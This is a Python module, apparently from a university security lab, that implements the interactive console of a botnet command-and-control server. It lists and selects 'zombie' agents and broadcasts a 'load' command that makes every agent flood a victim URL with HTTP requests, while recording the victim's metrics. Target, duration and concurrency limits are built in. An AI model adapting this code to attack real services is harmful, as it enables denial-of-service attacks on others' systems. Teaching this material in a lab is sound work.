"""Menu de consola interactivo del servidor C2."""
from __future__ import annotations

import asyncio
import contextlib
import json
import logging
import shlex
import sys
import threading
import time
import uuid
from datetime import datetime
from typing import Callable
from urllib.parse import urlsplit, urlunsplit

from .agent import AgentConnection
from .config import PROJECT_ROOT, Config
from .manager import AgentManager
from .metrics import fetch_target_metrics, is_netdata_reachable

log = logging.getLogger("c2.console")

REQUEST_TIMEOUT = 10.0
SAMPLE_INTERVAL = 5.0
AFTER_SAMPLE_DELAY = 10.0
MAX_DURATION_S = 120
MAX_CONCURRENCY = 200
LOCAL_TARGET_HOSTS = {"127.0.0.1", "localhost", "::1"}
PROMPT = "c2> "

CONSOLE_COMMANDS = (
    "list",
    "select",
    "unselect",
    "send",
    "broadcast",
    "ping",
    "kick",
    "metrics",
    "status",
    "clear",
    "help",
    "exit",
    "ls",
    "agents",
    "agentes",
    "deselect",
    "metricas",
    "cls",
    "quit",
    "salir",
    "?",
)
AGENT_SUBCOMMANDS = ("load", "ping", "info", "echo", "stop")
LOAD_KEYS = ("target=", "duration=", "concurrency=")


def _fit(text: str, width: int) -> str:
    text = str(text)
    if len(text) <= width:
        return text
    return text[: width - 1] + "~"


def _fmt_duration(seconds: float) -> str:
    seconds = max(0, int(seconds))
    if seconds < 60:
        return f"{seconds}s"
    minutes, rest = divmod(seconds, 60)
    if minutes < 60:
        return f"{minutes}m{rest:02d}s"
    hours, rest = divmod(minutes, 60)
    return f"{hours}h{rest:02d}m"


def _as_int(value, default: int) -> int:
    try:
        return int(value)
    except (TypeError, ValueError):
        return default


def _positive_int(value, default: int, maximum: int, field: str) -> int:
    if value is None or value == "":
        return default
    if isinstance(value, bool):
        raise ValueError(f"{field} invalido: debe ser un entero mayor que 0")
    try:
        number = int(value)
    except (TypeError, ValueError):
        raise ValueError(f"{field} invalido: debe ser un entero mayor que 0") from None
    if number <= 0:
        raise ValueError(f"{field} invalido: debe ser un entero mayor que 0")
    return min(number, maximum)


def _redact_url(url: str) -> str:
    """Devuelve la URL sin credenciales (user:pass@) para mostrarla en logs y consola."""
    try:
        parts = urlsplit(url)
        hostname = parts.hostname or ""
        port = parts.port
    except ValueError:
        return url
    if not parts.username and not parts.password:
        return url
    netloc = f"[{hostname}]" if ":" in hostname else hostname
    if port is not None:
        netloc = f"{netloc}:{port}"
    return urlunsplit((parts.scheme, netloc, parts.path, parts.query, parts.fragment))


def _normalize_target(value, config: Config) -> str:
    target = str(value).strip()
    if not target:
        raise ValueError("falta target=http://host[:puerto][/ruta]")
    try:
        parsed = urlsplit(target)
        port = parsed.port
    except ValueError as exc:
        raise ValueError(f"target invalido: {exc}") from None
    host = parsed.hostname
    if parsed.scheme.lower() != "http" or not host:
        raise ValueError("target invalido: use http://host[:puerto][/ruta]")
    allowed = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_:")
    if any(character not in allowed for character in host):
        raise ValueError("target invalido: hostname no permitido")
    local_target = host.lower() in LOCAL_TARGET_HOSTS
    configured_host = config.target_host.strip().lower()
    if configured_host and not local_target and host.lower() != configured_host:
        raise ValueError(f"target no permitido: se esperaba {config.target_host}")
    configured_port = config.target_http_port
    if port is None:
        port = configured_port
    elif configured_port is not None and not local_target and port != configured_port:
        raise ValueError(f"puerto no permitido: se esperaba {configured_port}")
    host_part = f"[{host}]" if ":" in host else host
    netloc = f"{host_part}:{port}" if port is not None else host_part
    return urlunsplit(("http", netloc, parsed.path or "/", parsed.query, ""))


def normalize_load_args(args: dict, config: Config) -> dict:
    if args.get("target") is None:
        raise ValueError("falta target=http://host[:puerto][/ruta]")
    return {
        "target": _normalize_target(args.get("target"), config),
        "duration": _positive_int(args.get("duration"), 30, MAX_DURATION_S, "duration"),
        "concurrency": _positive_int(args.get("concurrency"), 20, MAX_CONCURRENCY, "concurrency"),
    }


def _command_timeout(name: str, args: dict) -> float:
    if name == "load":
        return _as_int(args.get("duration"), 30) + 20.0
    return REQUEST_TIMEOUT


def _parse_command(rest: list[str]) -> tuple[str, dict]:
    name = rest[0]
    args: dict = {}
    positional: list[str] = []
    for token in rest[1:]:
        if "=" in token:
            key, _, value = token.partition("=")
            if key:
                args[key] = value
        else:
            positional.append(token)
    if positional:
        args["text"] = " ".join(positional)
    return name, args


def completion_options(buffer: str, agent_refs: list[str], text: str = "") -> list[str]:
    """Opciones de autocompletado segun el contenido actual de la linea.

    `buffer` es el texto de la linea sin el prompt; `agent_refs` son los
    indices e ids de los agentes conectados (ej: ["0", "zombie-01"]); `text`
    es la palabra que se esta completando (filtra por prefijo).
    """
    parts = buffer.split()
    trailing = buffer.endswith(" ")
    if not parts or (len(parts) == 1 and not trailing):
        options = list(CONSOLE_COMMANDS)
    else:
        head = parts[0]
        if head in ("select", "ping", "kick"):
            options = list(agent_refs)
            if head == "ping":
                options.append("all")
        elif head in ("send", "broadcast"):
            if len(parts) == 1:
                options = list(AGENT_SUBCOMMANDS)
            elif len(parts) == 2 and not trailing:
                options = list(AGENT_SUBCOMMANDS)
            elif parts[1] == "load" and (trailing or len(parts) > 2):
                used = parts[2:]
                options = [key for key in LOAD_KEYS if not any(part.startswith(key) for part in used)]
            else:
                options = []
        elif head in ("metrics", "metricas"):
            options = ["antes", "durante", "despues", "manual"]
        else:
            options = []
    return [option for option in options if option.startswith(text)]


class _StdinReader:
    """Lee stdin en un hilo daemon para no bloquear el cierre del proceso.

    Si el modulo readline esta disponible y stdin es una terminal, usa
    input() para habilitar autocompletado con Tab e historial con las
    flechas; en caso contrario usa sys.stdin.readline() sin edicion.
    """

    def __init__(
        self,
        loop: asyncio.AbstractEventLoop,
        agent_refs_provider: Callable[[], list[str]] | None = None,
    ) -> None:
        self._loop = loop
        self._queue: asyncio.Queue[str | None] = asyncio.Queue()
        self._thread = threading.Thread(target=self._read_loop, daemon=True)
        self._agent_refs_provider = agent_refs_provider or (lambda: [])
        self._readline = None
        self._resume = threading.Event()
        self._resume.set()

    def start(self) -> None:
        self._thread.start()

    def allow_prompt(self) -> None:
        """Autoriza al hilo lector a mostrar el siguiente prompt."""
        self._resume.set()

    def _setup_readline(self) -> None:
        try:
            import readline
        except ImportError:
            return
        if not sys.stdin.isatty() or not sys.stdout.isatty():
            return
        try:
            readline.parse_and_bind("tab: complete")
            readline.set_completer_delims(" \t")
            readline.set_completer(self._complete)
        except Exception:
            return
        self._readline = readline

    def _complete(self, text: str, state: int) -> str | None:
        try:
            agent_refs = list(self._agent_refs_provider())
        except Exception:
            agent_refs = []
        try:
            buffer = self._readline.get_line_buffer() if self._readline else text
        except Exception:
            buffer = text
        try:
            options = completion_options(buffer, agent_refs, text)
        except Exception:
            options = []
        if state < len(options):
            return options[state]
        return None

    def _read_loop(self) -> None:
        self._setup_readline()
        while True:
            self._resume.wait()
            self._resume.clear()
            try:
                if self._readline is not None:
                    line = input(PROMPT)
                    if line.strip():
                        with contextlib.suppress(Exception):
                            self._readline.add_history(line)
                else:
                    print(PROMPT, end="", flush=True)
                    line = sys.stdin.readline()
            except Exception:
                line = ""
            try:
                self._loop.call_soon_threadsafe(self._queue.put_nowait, line if line else None)
            except RuntimeError:
                return
            if not line:
                return

    async def readline(self) -> str | None:
        return await self._queue.get()


class Console:
    """Interfaz de linea de comandos para administrar el C2."""

    def __init__(
        self,
        manager: AgentManager,
        config: Config,
        after_delay: float = AFTER_SAMPLE_DELAY,
    ) -> None:
        self.manager = manager
        self.config = config
        self.after_delay = after_delay
        self.selected: AgentConnection | None = None

    def event(self, text: str) -> None:
        print(f"\n{text}", flush=True)

    async def run(self) -> None:
        self._print_banner()
        reader = _StdinReader(asyncio.get_running_loop(), self._agent_refs)
        reader.start()
        while True:
            line = await reader.readline()
            if line is None:
                print()
                break
            line = line.strip()
            if not line:
                reader.allow_prompt()
                continue
            try:
                parts = shlex.split(line)
            except ValueError as exc:
                print(f"entrada invalida: {exc}")
                reader.allow_prompt()
                continue
            command = parts[0].lower()
            rest = parts[1:]
            if command in ("exit", "quit", "salir"):
                break
            try:
                await self._dispatch(command, rest)
            except Exception as exc:
                print(f"error: {exc}")
            reader.allow_prompt()

    def _agent_refs(self) -> list[str]:
        agents = self.manager.agents
        refs = [str(index) for index in range(len(agents))]
        refs.extend(agent.agent_id for agent in agents)
        return refs

    async def _dispatch(self, command: str, rest: list[str]) -> None:
        if command in ("help", "?"):
            self._print_help()
        elif command in ("list", "ls", "agents", "agentes"):
            self._print_agents()
        elif command == "select":
            self._cmd_select(rest)
        elif command in ("unselect", "deselect"):
            self.selected = None
            print("(sin agente seleccionado)")
        elif command == "send":
            await self._cmd_send(rest)
        elif command == "broadcast":
            await self._cmd_broadcast(rest)
        elif command == "ping":
            await self._cmd_ping(rest)
        elif command == "kick":
            await self._cmd_kick(rest)
        elif command in ("metrics", "metricas"):
            await self._cmd_metrics(rest)
        elif command == "status":
            self._cmd_status()
        elif command in ("clear", "cls"):
            print("\x1b[2J\x1b[H", end="", flush=True)
        else:
            print(f"comando desconocido: {command} (use 'help')")

    def _print_banner(self) -> None:
        print("=" * 66)
        print(" Servidor C2 - Seguridad de TI II (UTN) - entorno de laboratorio")
        print(
            f" escucha en {self.manager.bind_host}:{self.manager.port} | "
            f"agentes conectados: {len(self.manager.agents)}"
        )
        print(" escriba 'help' para ver los comandos disponibles")
        print("=" * 66)

    def _print_help(self) -> None:
        print(" comandos disponibles (Tab autocompleta):")
        print("   list                      lista los agentes conectados")
        print("   select <#|id>             selecciona un agente (ej: select 0)")
        print("   unselect                  quita la seleccion")
        print("   send <cmd> [clave=valor]  envia un comando al agente seleccionado (ej: send info)")
        print("   broadcast <cmd> [k=v ...] envia un comando a todos los agentes")
        print("   ping <#|id|all>           prueba de vida (ej: ping all)")
        print("   kick <#|id>               cierra la conexion de un agente (ej: kick 0)")
        print("   metrics [etiqueta]        registra metricas del objetivo (API Netdata)")
        print("   status                    estado del servidor")
        print("   clear                     limpia la pantalla")
        print("   exit                      apaga el servidor")
        print("   Ctrl+B  D                 salir de la consola sin apagar el C2 (detach de tmux)")
        print(" ejemplo rapido de una sesion:")
        print("   list                                     # ver los zombies conectados")
        print("   select 0                                 # elegir el zombie #0")
        print("   ping all                                 # prueba de vida de todos")
        print("   send info                                # datos del equipo del zombie")
        print("   broadcast load target=http://IP_VICTIMA duration=30 concurrency=20")
        print("                                            # inundacion de 30 s contra la victima")
        print("   metrics durante                          # guardar metricas en data/metricas.jsonl")
        print("   kick 1                                   # expulsar al zombie #1")

    def _print_agents(self) -> None:
        agents = self.manager.agents
        if not agents:
            print("(sin agentes conectados)")
            return
        print(
            f"{' ':<2}{'#':>2}  {'ID':<16}{'EQUIPO':<18}{'USUARIO':<14}"
            f"{'SO':<18}{'DIRECCION':<22}{'CONECTADO':>10}{'IDLE':>7}"
        )
        for index, agent in enumerate(agents):
            marker = "*" if agent is self.selected else " "
            print(
                f"{marker:<2}{index:>2}  "
                f"{_fit(agent.agent_id, 16):<16}"
                f"{_fit(agent.hostname, 18):<18}"
                f"{_fit(agent.user, 14):<14}"
                f"{_fit(agent.os_info, 18):<18}"
                f"{_fit(agent.peer, 22):<22}"
                f"{_fmt_duration(agent.age):>10}"
                f"{_fmt_duration(agent.idle):>7}"
            )

    def _cmd_select(self, rest: list[str]) -> None:
        if not rest:
            print("uso: select <#|id>")
            return
        agent = self.manager.find(rest[0])
        if agent is None:
            print(f"no se encontro un agente: {rest[0]}")
            return
        self.selected = agent
        print(f"agente seleccionado: {agent.agent_id} ({agent.hostname or 'sin nombre'})")

    async def _cmd_send(self, rest: list[str]) -> None:
        if self.selected is None:
            print("primero seleccione un agente con 'select <#|id>'")
            return
        if not rest:
            print("uso: send <cmd> [clave=valor ...]")
            return
        name, args = _parse_command(rest)
        if name == "load":
            try:
                args = normalize_load_args(args, self.config)
            except ValueError as exc:
                print(f"error: {exc}")
                return
        await self._request_and_print(self.selected, name, args)

    async def _cmd_broadcast(self, rest: list[str]) -> None:
        if not rest:
            print("uso: broadcast <cmd> [clave=valor ...]")
            return
        name, args = _parse_command(rest)
        if name == "load":
            await self._load_broadcast(args)
            return
        agents = self.manager.agents
        if not agents:
            print("(sin agentes conectados)")
            return
        started = time.monotonic()
        responses = await self.manager.broadcast(name, args, timeout=REQUEST_TIMEOUT)
        elapsed = (time.monotonic() - started) * 1000
        ok = 0
        for agent, response in responses:
            if isinstance(response, BaseException):
                print(f"{agent.agent_id}: error ({response})")
                continue
            status = response.get("status", "ok")
            if status == "ok":
                ok += 1
            data = response.get("data", {})
            print(f"{agent.agent_id} [{status}]: {json.dumps(data, ensure_ascii=False)}")
        print(f"-> {ok}/{len(agents)} respondieron ok en {elapsed:.0f} ms")

    async def _load_broadcast(self, args: dict) -> None:
        try:
            request_args = normalize_load_args(args, self.config)
        except ValueError as exc:
            print(f"error: {exc}")
            print("uso: broadcast load target=http://IP_OBJETIVO [duration=30] [concurrency=20]")
            return
        agents = self.manager.agents
        if not agents:
            print("(sin agentes conectados)")
            return
        duration = request_args["duration"]
        concurrency = request_args["concurrency"]
        metadata = {
            "run_id": uuid.uuid4().hex[:8],
            "target": request_args["target"],
            "duration": duration,
            "concurrency": concurrency,
        }
        await self._snapshot("antes", metadata)
        print(
            f"inundacion en curso: {len(agents)} agente(s) -> {request_args['target']} "
            f"durante ~{duration}s ({concurrency} conexiones por agente)"
        )
        sampler = asyncio.create_task(self._sample_loop(metadata))
        try:
            responses = await self.manager.broadcast("load", request_args, timeout=duration + 20.0)
        finally:
            sampler.cancel()
            with contextlib.suppress(asyncio.CancelledError):
                await sampler
        total_sent = 0
        total_errors = 0
        ok = 0
        for agent, response in responses:
            if isinstance(response, BaseException):
                print(f"{agent.agent_id}: error ({response})")
                continue
            status = response.get("status", "ok")
            data = response.get("data") or {}
            if status == "ok":
                ok += 1
                total_sent += _as_int(data.get("sent"), 0)
                total_errors += _as_int(data.get("errors"), 0)
            print(f"{agent.agent_id} [{status}]: {json.dumps(data, ensure_ascii=False)}")
        rps = total_sent / duration
        summary = {
            "agents": len(agents),
            "ok": ok,
            "sent": total_sent,
            "errors": total_errors,
            "rps": round(rps, 1),
        }
        print(
            f"-> {ok}/{len(agents)} ok | solicitudes enviadas: {total_sent} | "
            f"errores: {total_errors} | rps agregado: {rps:.0f}"
        )
        if self.after_delay > 0:
            await asyncio.sleep(self.after_delay)
        await self._snapshot("despues", {**metadata, "summary": summary})

    async def _cmd_ping(self, rest: list[str]) -> None:
        if rest and rest[0].lower() in ("all", "todos", "*"):
            await self._cmd_broadcast(["ping"])
            return
        if rest:
            agent = self.manager.find(rest[0])
            if agent is None:
                print(f"no se encontro un agente: {rest[0]}")
                return
        else:
            agent = self.selected
        if agent is None:
            print("uso: ping <#|id|all> (o seleccione un agente)")
            return
        await self._request_and_print(agent, "ping", {})

    async def _cmd_kick(self, rest: list[str]) -> None:
        if not rest:
            print("uso: kick <#|id>")
            return
        agent = self.manager.find(rest[0])
        if agent is None:
            print(f"no se encontro un agente: {rest[0]}")
            return
        with contextlib.suppress(Exception):
            await asyncio.wait_for(
                agent.send({"type": "bye", "reason": "kicked"}),
                timeout=1.0,
            )
        agent.fail_pending(ConnectionError("agente expulsado"))
        agent.close()
        if agent is self.selected:
            self.selected = None
        print(f"conexion cerrada: {agent.agent_id}")

    async def _cmd_metrics(self, rest: list[str]) -> None:
        label = rest[0] if rest else "manual"
        await self._snapshot(label)

    async def _snapshot(self, label: str = "manual", extra: dict | None = None) -> bool:
        if not self.config.netdata_url:
            message = "[metricas] NETDATA_URL no esta configurada en .env; no se pueden registrar metricas"
            print(message)
            log.warning(message)
            return False
        reachable = await asyncio.to_thread(is_netdata_reachable, self.config.netdata_url)
        if not reachable:
            message = f"[metricas:{label}] Netdata no responde en {_redact_url(self.config.netdata_url)}"
            print(message)
            log.warning(message)
            return False
        try:
            values = await asyncio.to_thread(fetch_target_metrics, self.config.netdata_url)
        except Exception as exc:
            message = f"[metricas:{label}] error consultando Netdata: {exc}"
            print(message)
            log.warning(message)
            return False
        record = {
            "ts": datetime.now().astimezone().isoformat(timespec="seconds"),
            "label": label,
            **(extra or {}),
            **values,
        }
        self.config.data_dir.mkdir(parents=True, exist_ok=True)
        path = self.config.data_dir / "metricas.jsonl"
        with path.open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(record, ensure_ascii=False) + "\n")
        try:
            shown = path.relative_to(PROJECT_ROOT).as_posix()
        except ValueError:
            shown = str(path)
        if all(value is None for value in values.values()):
            log.warning("[metricas:%s] Netdata no devolvio valores utiles", label)
        cpu = "sin dato" if values["cpu_pct"] is None else f"{values['cpu_pct']}%"
        ram = "sin dato" if values["ram_pct"] is None else f"{values['ram_pct']}%"
        net = "sin dato" if values["net_kbit_s"] is None else f"{values['net_kbit_s']} kbit/s"
        print(f"[metricas:{label}] cpu {cpu} | ram {ram} | red {net} | guardado en {shown}")
        return True

    async def _sample_loop(self, extra: dict | None = None) -> None:
        try:
            while True:
                await asyncio.sleep(SAMPLE_INTERVAL)
                try:
                    ok = await self._snapshot("durante", extra)
                except asyncio.CancelledError:
                    raise
                except Exception:
                    log.exception("error en muestra durante")
                    continue
                if not ok:
                    log.warning("muestra durante fallida; se continua con la siguiente")
        except asyncio.CancelledError:
            return

    def _cmd_status(self) -> None:
        uptime = _fmt_duration(time.monotonic() - self.manager.started_at)
        print(
            f"escucha: {self.manager.bind_host}:{self.manager.port} | "
            f"uptime: {uptime} | agentes: {len(self.manager.agents)} | "
            f"conexiones totales: {self.manager.total_connections}"
        )

    async def _request_and_print(self, agent: AgentConnection, name: str, args: dict, timeout: float | None = None) -> None:
        if timeout is None:
            timeout = _command_timeout(name, args)
        started = time.monotonic()
        try:
            response = await agent.request(name, args, timeout=timeout)
        except asyncio.TimeoutError:
            print(f"{agent.agent_id}: sin respuesta (timeout de {timeout:.0f}s)")
            return
        except ConnectionError as exc:
            print(f"{agent.agent_id}: error de conexion ({exc})")
            return
        elapsed = (time.monotonic() - started) * 1000
        status = response.get("status", "ok")
        data = response.get("data", {})
        print(f"{agent.agent_id} [{status}] {elapsed:.0f} ms: {json.dumps(data, ensure_ascii=False)}")
